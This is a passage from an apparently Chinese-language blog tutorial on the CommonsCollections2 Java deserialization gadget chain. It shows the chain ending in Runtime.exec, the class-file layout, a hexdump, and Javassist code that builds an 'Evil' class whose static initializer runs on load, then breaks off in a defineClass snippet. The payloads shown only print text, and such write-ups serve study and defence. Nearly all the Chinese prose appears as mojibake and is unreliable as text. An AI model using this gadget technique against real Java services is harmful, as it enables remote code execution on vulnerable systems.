<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>ÂêéËÆ∞ÔºöËøôÊù°ÈìæÂàÜÊûêÂú®ÂÖ•Èó®ÁöÑÊó∂ÂÄôÈöæÂ∫¶Á°ÆÂÆûÊå∫Â§ßÁöÑÔºå‰ΩÜÊòØÂèëÁé∞‰∏ç‰ºöÁöÑÂ∞±ÂèçÂ§çÁúãÊ∫êÁ†ÅÂíå‰∏ä‰∏ãÊñáÔºåÊâæËµÑÊñôÂÜô demoÔºåË∞ÉËØïÂàÜÊûêÔºåËøòÊòØ‰∏ÄÊ≠•Ê≠•Âú∞Â≠¶‰π†ÂàÜÊûê‰∫Ü‰∏ÄÈÅçÔºåÂ∞§ÂÖ∂ÊòØÁºñÂÜô‰∏ÄÂùóÂØπÂ¶Ç‰ΩïÊûÑÈÄ†Êúâ‰∫ÜÂàùÊ≠•ÁöÑÁêÜËß£ÔºõÂêéÈù¢ÊòØ AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()Ôºå‰∏∫‰∫ÜËÉΩËß¶Âèë invokeÔºå‰ΩøÁî®‰∫ÜÂä®ÊÄÅ‰ª£ÁêÜÁöÑÊñπÂºèÔºåÈÇ£ËÉΩ‰∏çËÉΩ‰ΩøÁî®ÂèçÂ∞ÑË∞ÉÁî® AnnotationInvocationHandler.invoke()Âë¢Ôºü</p>
<p>ÂÖ∂ÂÆûËøô‰∏™ÊÉ≥Ê≥ïÂæàË†¢ÔºåËØ¥Âà∞Â∫ïËøòÊòØÂ≠¶‰π†Â∫ûÊùÇÁöÑÂÜÖÂÆπÈÄ†ÊàêÁöÑÂπªËßâÔºåÂΩìÁÑ∂ËÉΩÂ§üË∞ÉÁî®Ëøô‰∏™ invoke ÊñπÊ≥ïÔºå‰ΩÜÊòØËøô‰∏™ invoke ÊñπÊ≥ïÈúÄË¶Å‰º†ÂÖ•ÁöÑÈÉΩÊòØ‰ª£ÁêÜÂØπË±°Ôºå‰ª£ÁêÜÂØπË±°ÂÜÖÁöÑÊñπÊ≥ï</p>
<p>ÂÖ∑‰ΩìÁöÑÁªÜËäÇÊõ¥Â∫îËØ•ÂÖ≥Ê≥®ÁöÑÊòØÔºåË∞ÉÁî®‰∫Ü‰ª£ÁêÜÂØπË±°Â¶Ç‰ΩïËß¶Âèë‰∫Ü invoke ÊñπÊ≥ïÔºå‰ª•Âèä‰º†ÂÖ•ÁöÑÂèÇÊï∞ÊòØ‰ªéÂì™ÈáåËé∑ÂæóÁöÑ</p>
<p>LazyMap Âú® CommonsCollections4.0 Ê≤°Êúâ LazyMap.decorate ÊñπÊ≥ïÔºåËÄåÊòØÊîπ‰∫Ü‰∏Ä‰∏™Âêç LazyMap.lazymap</p>
<p>Âõ†Ê≠§ CC1„ÄÅCC3 ÈÉΩÂèØ‰ª•Áî® CommonsCollections4 ÁöÑ jar ÂåÖÔºåÂú® LazyMap Êó∂Êç¢‰∏Ä‰∏ãÊñπÊ≥ïÂêçËÄåÂ∑≤</p>
</blockquote>
<h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="Pre-1"><a href="#Pre-1" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-1"><a href="#ÈôêÂà∂-1" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 4.0</p>
<p>javassit</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-1"><a href="#Âà©Áî®Èìæ-1" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">		...</span><br><span class="hljs-operator">			</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-1"><a href="#ÂÖ≥ÈîÆÁ±ª-1" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">TransformingComparator</span><br></code></pre></td></tr></table></figure>

<p>maven Ê∑ªÂä†‰æùËµñ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>È¶ñÂÖàÊù•Â≠¶‰π†‰∏Ä‰∫õÈì∫Âû´ÁöÑÂâçÁΩÆÁü•ËØÜÔºåÊ∫ê‰ª£Á†Å„ÄÅÂ≠óËäÇÁ†Å„ÄÅÊú∫Âô®Á†ÅËøô‰∫õÊ¶ÇÂøµÂ∞±‰∏çÂÜçËµòËø∞‰∫Ü</p>
<p>Â≠óËäÇÁ†ÅÊñá‰ª∂ÊòØÊúâÂõ∫ÂÆöÁöÑÁªìÊûÑÁöÑÔºå<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">JVM ËßÑËåÉ</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs class">ClassFile &#123;<br>    u4             magic;//cafe babeÊòØÈ≠îÊï∞Âç≥classÊñá‰ª∂Ê†áËØÜÁ¨¶,JVMÂä†ËΩΩclassÊñá‰ª∂Êó∂‰ºöÂÖàËØªÂèñËøô4‰∏™Â≠óËäÇ<br>    u2             minor_version;//ÂâØÁâàÊú¨Âè∑<br>    u2             major_version;//‰∏ªÁâàÊú¨Âè∑ 0034ÊòØjdk1.8<br>    u2             constant_pool_count;//Â∏∏ÈáèÊ±†ËÆ°Êï∞Âô®<br>    cp_info        constant_pool[constant_pool_count-1];//Â∏∏ÈáèÊ±†<br>    u2             access_flags;//ËÆøÈóÆÊ†áËØÜ<br>    u2             this_class;//ÂΩìÂâçÁ±ª<br>    u2             super_class;//Áà∂Á±ª<br>    u2             interfaces_count;//Á±ªÁªßÊâøÊàñÂÆûÁé∞Êé•Âè£Êï∞<br>    u2             interfaces[interfaces_count];//Êé•Âè£Êï∞ÁªÑ<br>    u2             fields_count;//Á±ªÊàêÂëòÂèòÈáèÊï∞<br>    field_info     fields[fields_count];//Á±ªÊàêÂëòÂèòÈáèÊï∞ÁªÑ<br>    u2             methods_count;//Á±ªÊàêÂëòÊñπÊ≥ïÊï∞<br>    method_info    methods[methods_count];//Á±ªÊàêÂëòÊñπÊ≥ïÊï∞ÁªÑ<br>    u2             attributes_count;//Á±ªÂ±ûÊÄßÊï∞<br>    attribute_info attributes[attributes_count];//Â±ûÊÄßÊï∞ÁªÑ<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âú® JVM ËßÑËåÉ‰∏≠<code>u1</code>„ÄÅ<code>u2</code>„ÄÅ<code>u4</code>ÂàÜÂà´Ë°®Á§∫ÁöÑÊòØ 1„ÄÅ2„ÄÅ4 ‰∏™Â≠óËäÇÁöÑÊó†Á¨¶Âè∑Êï∞ÔºåÂèØ‰ΩøÁî®<code>java.io.DataInputStream</code>Á±ª‰∏≠ÁöÑÂØπÂ∫îÊñπÊ≥ïÔºö<code>readUnsignedByte</code>„ÄÅ<code>readUnsignedShort</code>„ÄÅ<code>readInt</code>ÊñπÊ≥ïËØªÂèñ„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåË°®ÁªìÊûÑ(<code>table</code>)Áî±‰ªªÊÑèÊï∞ÈáèÁöÑÂèØÂèòÈïøÂ∫¶ÁöÑÈ°πÁªÑÊàêÔºåÁî®‰∫éË°®Á§∫ class ‰∏≠ÁöÑÂ§çÊùÇÁªìÊûÑÔºåÂ¶Ç‰∏äËø∞ÁöÑÔºö<code>cp_info</code>„ÄÅ<code>field_info</code>„ÄÅ<code>method_info</code>„ÄÅ<code>attribute_info</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span>: cafe babe <span class="hljs-number">0000</span> <span class="hljs-number">0034</span> <span class="hljs-number">001</span>d <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0600</span> <span class="hljs-number">0</span>f<span class="hljs-number">09</span>  .......<span class="hljs-number">4</span>........<br><span class="hljs-attribute">00000010</span>: <span class="hljs-number">0010</span> <span class="hljs-number">0011</span> <span class="hljs-number">0800</span> <span class="hljs-number">120</span>a <span class="hljs-number">0013</span> <span class="hljs-number">0014</span> <span class="hljs-number">0700</span> <span class="hljs-number">1507</span>  ................<br><span class="hljs-attribute">00000020</span>: <span class="hljs-number">0016</span> <span class="hljs-number">0100</span> <span class="hljs-number">063</span>c <span class="hljs-number">696</span>e <span class="hljs-number">6974</span> <span class="hljs-number">3</span>e<span class="hljs-number">01</span> <span class="hljs-number">0003</span> <span class="hljs-number">2829</span>  .....&lt;init&gt;...()<br><span class="hljs-attribute">00000030</span>: <span class="hljs-number">5601</span> <span class="hljs-number">0004</span> <span class="hljs-number">436</span>f <span class="hljs-number">6465</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>f<span class="hljs-number">4</span>c <span class="hljs-number">696</span>e <span class="hljs-number">654</span>e  V...Code...LineN<br><span class="hljs-attribute">00000040</span>: <span class="hljs-number">756</span>d <span class="hljs-number">6265</span> <span class="hljs-number">7254</span> <span class="hljs-number">6162</span> <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">0100</span> <span class="hljs-number">046</span>d <span class="hljs-number">6169</span>  umberTable...mai<br><span class="hljs-attribute">00000050</span>: <span class="hljs-number">6</span>e<span class="hljs-number">01</span> <span class="hljs-number">0016</span> <span class="hljs-number">285</span>b <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span>  n...([Ljava/lang<br><span class="hljs-attribute">00000060</span>: <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">53</span> <span class="hljs-number">6</span>f<span class="hljs-number">75</span>  /String;)V...Sou<br><span class="hljs-attribute">00000070</span>: <span class="hljs-number">7263</span> <span class="hljs-number">6546</span> <span class="hljs-number">696</span>c <span class="hljs-number">6501</span> <span class="hljs-number">0008</span> <span class="hljs-number">4343</span> <span class="hljs-number">322</span>e <span class="hljs-number">6</span>a<span class="hljs-number">61</span>  rceFile...CC<span class="hljs-number">2</span>.ja<br><span class="hljs-attribute">00000080</span>: <span class="hljs-number">7661</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0700</span> <span class="hljs-number">0807</span> <span class="hljs-number">0017</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1800</span> <span class="hljs-number">1901</span>  va..............<br><span class="hljs-attribute">00000090</span>: <span class="hljs-number">000</span>b <span class="hljs-number">4865</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">6</span>f<span class="hljs-number">20</span> <span class="hljs-number">576</span>f <span class="hljs-number">726</span>c <span class="hljs-number">6407</span> <span class="hljs-number">001</span>a  ..Hello World...<br><span class="hljs-attribute">000000a0</span>: <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1</span>b<span class="hljs-number">00</span> <span class="hljs-number">1</span>c<span class="hljs-number">01</span> <span class="hljs-number">001</span>a <span class="hljs-number">436</span>f <span class="hljs-number">6</span>d<span class="hljs-number">6</span>d <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e <span class="hljs-number">7343</span>  ........CommonsC<br><span class="hljs-attribute">000000b0</span>: <span class="hljs-number">6</span>f<span class="hljs-number">6</span>c <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">6374</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e<span class="hljs-number">73</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span> <span class="hljs-number">4332</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span>  ollections/CC<span class="hljs-number">2</span>/C<br><span class="hljs-attribute">000000c0</span>: <span class="hljs-number">4332</span> <span class="hljs-number">0100</span> <span class="hljs-number">106</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">4</span>f  C<span class="hljs-number">2</span>...java/lang/O<br><span class="hljs-attribute">000000d0</span>: <span class="hljs-number">626</span>a <span class="hljs-number">6563</span> <span class="hljs-number">7401</span> <span class="hljs-number">0010</span> <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">6</span>c <span class="hljs-number">616</span>e  bject...java/lan<br><span class="hljs-attribute">000000e0</span>: <span class="hljs-number">672</span>f <span class="hljs-number">5379</span> <span class="hljs-number">7374</span> <span class="hljs-number">656</span>d <span class="hljs-number">0100</span> <span class="hljs-number">036</span>f <span class="hljs-number">7574</span> <span class="hljs-number">0100</span>  g/System...out..<br><span class="hljs-attribute">000000f0</span>: <span class="hljs-number">154</span>c <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">69</span> <span class="hljs-number">6</span>f<span class="hljs-number">2</span>f <span class="hljs-number">5072</span> <span class="hljs-number">696</span>e <span class="hljs-number">7453</span>  .Ljava/io/PrintS<br><span class="hljs-attribute">00000100</span>: <span class="hljs-number">7472</span> <span class="hljs-number">6561</span> <span class="hljs-number">6</span>d<span class="hljs-number">3</span>b <span class="hljs-number">0100</span> <span class="hljs-number">136</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">696</span>f  tream;...java/io<br><span class="hljs-attribute">00000110</span>: <span class="hljs-number">2</span>f<span class="hljs-number">50</span> <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">5374</span> <span class="hljs-number">7265</span> <span class="hljs-number">616</span>d <span class="hljs-number">0100</span> <span class="hljs-number">0770</span>  /PrintStream...p<br><span class="hljs-attribute">00000120</span>: <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>e <span class="hljs-number">0100</span> <span class="hljs-number">1528</span> <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f  rintln...(Ljava/<br><span class="hljs-attribute">00000130</span>: <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0021</span>  lang/String;)V.!<br><span class="hljs-attribute">00000140</span>: <span class="hljs-number">0005</span> <span class="hljs-number">0006</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0001</span> <span class="hljs-number">0007</span> <span class="hljs-number">0008</span>  ................<br><span class="hljs-attribute">00000150</span>: <span class="hljs-number">0001</span> <span class="hljs-number">0009</span> <span class="hljs-number">0000</span> <span class="hljs-number">001</span>d <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0000</span> <span class="hljs-number">0005</span>  ................<br><span class="hljs-attribute">00000160</span>: <span class="hljs-number">2</span>ab<span class="hljs-number">7</span> <span class="hljs-number">0001</span> b<span class="hljs-number">100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0600</span>  *...............<br><span class="hljs-attribute">00000170</span>: <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0300</span> <span class="hljs-number">0900</span> <span class="hljs-number">0</span>b<span class="hljs-number">00</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0100</span> <span class="hljs-number">0900</span>  ................<br><span class="hljs-attribute">00000180</span>: <span class="hljs-number">0000</span> <span class="hljs-number">2500</span> <span class="hljs-number">0200</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">09</span>b<span class="hljs-number">2</span> <span class="hljs-number">0002</span> <span class="hljs-number">1203</span>  ..%.............<br><span class="hljs-attribute">00000190</span>: b<span class="hljs-number">600</span> <span class="hljs-number">04</span>b<span class="hljs-number">1</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>a <span class="hljs-number">0000</span> <span class="hljs-number">000</span>a <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001a0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">0008</span> <span class="hljs-number">0006</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>d <span class="hljs-number">0000</span> <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001b0</span>: <span class="hljs-number">000</span>e                                     ..<br></code></pre></td></tr></table></figure>

<p>ÂÖ∂‰ªñËØ¶ËßÅ class Êñá‰ª∂Ëß£ÊûêÔºåclass Êñá‰ª∂Â±ûÊÄßËß£ÊûêÔºåjava ËôöÊãüÊú∫Êåá‰ª§ÈõÜ</p>
<p>Ê≠£ÊòØÊúâ‰∫ÜËøô‰∫õÂü∫Á°ÄÔºåÂá∫Áé∞‰∫Ü Java Â≠óËäÇÁ†ÅÂ∫ìÂÖÅËÆ∏Êàë‰ª¨ÈÄöËøáÂ≠óËäÇÁ†ÅÂ∫ìÁöÑ API Âä®ÊÄÅÂàõÂª∫‰øÆÊîπ Java Á±ª„ÄÅÊñπÊ≥ï„ÄÅÂèòÈáèÁ≠âÊìç‰ΩúÔºå‰æãÂ¶ÇÔºö‰∏ÄÁßçÈÄöÁî®ÁöÑ Java Â≠óËäÇÁ†ÅÊìç‰ΩúÂíåÂàÜÊûêÊ°ÜÊû∂<code>ASM</code>ÔºåÂèØ‰ª•Áõ¥Êé•‰ª•‰∫åËøõÂà∂ÂΩ¢Âºè‰øÆÊîπÁé∞ÊúâÁöÑÁ±ªÊàñËÄÖÁîüÊàêÁ±ªÊñá‰ª∂ÔºõÂè¶‰∏ÄÁßçÊòØ<code>Javassist</code>ÔºåÂÆÉÁõ∏ÊØî‰∫é<code>ASM</code>Êõ¥ÁÆÄ‰æøÔºåÊàë‰ª¨‰∏çÁî®ÂÖ≥Ê≥® Java Â∫ïÂ±ÇÁöÑÂ≠óËäÇÁ†ÅÂíåÊ†àÊìç‰ΩúÔºåÂ≠¶‰ºöÂ¶Ç‰Ωï‰ΩøÁî®ÂÖ∂ API Â∞±ÂèØ‰ª•ÂÆûÁé∞Â≠óËäÇÁ†ÅÁöÑÁºñËæë</p>
<p>ÂíåÂèçÂ∞ÑÂ∑Æ‰∏çÂ§öÁî®ÔºåÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://javasec.org/javase/JavaByteCode/Javassist.html">javasec</a> <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/article/35230124.html">w3cschool</a> <a target="_blank" rel="noopener" href="https://github.com/IndustriousSnail/javassist-learn">javaassist-translate</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections.CC2.Evil&quot;</span>);<br>        CtMethod Mmain = CtMethod.make(<br>                <span class="hljs-string">&quot;public static void main(String[] args) &#123;System.out.println(\&quot;main method\&quot;);&#125;&quot;</span>, ctClass<br>        );<br>        ctClass.addMethod(Mmain);<br>        ctClass.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>);<br>        CtMethod MSysinfo = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;Sysinfo&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        MSysinfo.setModifiers(<span class="hljs-number">1</span>);<br>        MSysinfo.setBody(<span class="hljs-string">&quot;System.out.println(System.getProperty(\&quot;os.name\&quot;));&quot;</span>);<br>        ctClass.addMethod(MSysinfo);<br>        ctClass.writeFile(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;main method&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;evil code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sysinfo</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Êó¢ÁÑ∂ÂèØ‰ª•ÈÄöËøá<code>Javassist</code>ÂÜôÂÖ•ÈùôÊÄÅ‰ª£Á†ÅÔºåÈÇ£‰πàÂè™Ë¶ÅÁ±ªÂÆû‰æãË¢´ÂàõÂª∫Â∞±‰ºöÊâßË°åÔºõÁîüÊàêÁöÑ class Êñá‰ª∂Â¶Ç‰ΩïÂà©Áî®Âë¢ÔºåËØªÂèñ‰∏∫ byte Êï∞ÁªÑÔºåÁÑ∂ÂêéÈÄöËøá<strong>ÁªßÊâø ClassLoaderÔºåÈáçÂÜô findClass ÊñπÊ≥ï</strong>ÊàñËÄÖÁõ¥Êé•<strong>ÂèçÂ∞ÑË∞ÉÁî® defineClass ÊñπÊ≥ï</strong>(‰∏çÊÉ≥ÈÅµÂæ™Âèå‰∫≤ÂßîÊ¥æÂèØ‰ª•<strong>ÈáçÂÜô loadClass</strong>)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br><span class="hljs-comment">//1</span><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> defineClass(Á±ªÂêç, Á±ªÂ≠óËäÇÁ†Å<span class="hljs-keyword">byte</span>Êï∞ÁªÑ, <span class="hljs-number">0</span>, <span class="hljs-keyword">byte</span>Êï∞ÁªÑÈïøÂ∫¶);<br>    &#125;<br><br><span 